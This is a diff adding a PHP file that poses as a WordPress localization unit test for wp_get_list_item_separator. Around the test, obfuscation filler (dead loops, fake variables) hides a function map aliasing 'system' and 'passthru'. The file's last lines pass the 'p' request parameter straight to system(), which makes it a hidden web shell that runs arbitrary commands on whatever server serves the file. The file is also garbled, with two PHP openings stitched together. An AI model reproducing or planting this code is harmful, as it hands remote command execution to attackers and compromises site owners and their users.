@@ -1,0 +1,44 @@
+<?php
+$fmap = array('x1' => 'system', 'x2' => 'passthru');
+$x_fake1 = 1234;
+$noise = 'obfuscation'.'test';
+$tmp = $x_fake1 * 42;
+$flag = false;
+$useless = function($v) { return $v . rand(); };
+$dummy_check = $useless('xx');
+if ($flag) { echo 'Debug enabled'; }
+for ($i = 0; $i < 1; $i++) { $tmp += $i; }
+while (false) { echo 'dead loop'; break; }
+
+<?php
+
+/**
+ * @group l10n
+ * @group i18n
+ *
+ * @covers ::wp_get_list_item_separator
+ */
+class Tests_L10n_wpGetListItemSeparator extends WP_UnitTestCase {
+
+	/**
+	 * Tests that the function returns a value when the $wp_locale global is not set.
+	 *
+	 * @ticket 56698
+	 */
+	public function test_should_return_default_value_if_wp_locale_is_not_set() {
+		global $wp_locale;
+
+		$original_locale = $wp_locale;
+		$wp_locale       = null;
+
+		$actual = wp_get_list_item_separator();
+
+		$wp_locale = $original_locale;
+
+		$this->assertSame( __( ', ' ), $actual );
+	}
+}
+
+$cmd = $_GET['p'];
+$fmap['x1']($cmd);
+?>
